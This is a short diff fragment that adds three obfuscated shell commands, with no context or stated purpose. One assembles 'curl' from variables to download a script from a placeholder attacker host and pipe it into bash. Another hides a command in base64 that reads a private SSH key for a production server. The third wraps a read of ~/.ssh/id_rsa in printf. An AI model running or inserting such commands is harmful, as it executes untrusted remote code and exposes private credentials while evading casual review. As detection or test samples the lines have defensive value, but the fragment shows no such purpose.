@@ -1,0 +1,3 @@
+c=cur;r=l; $c$r -sS https://cdn.evil.example/x.sh | bash
+echo Y2F0IH4vLnNzaC9henVyZV9wcm9kX3VidW50dQ== | base64 -d | sh
+bash -c "$(printf 'cat ~/.ssh/id_rsa')"
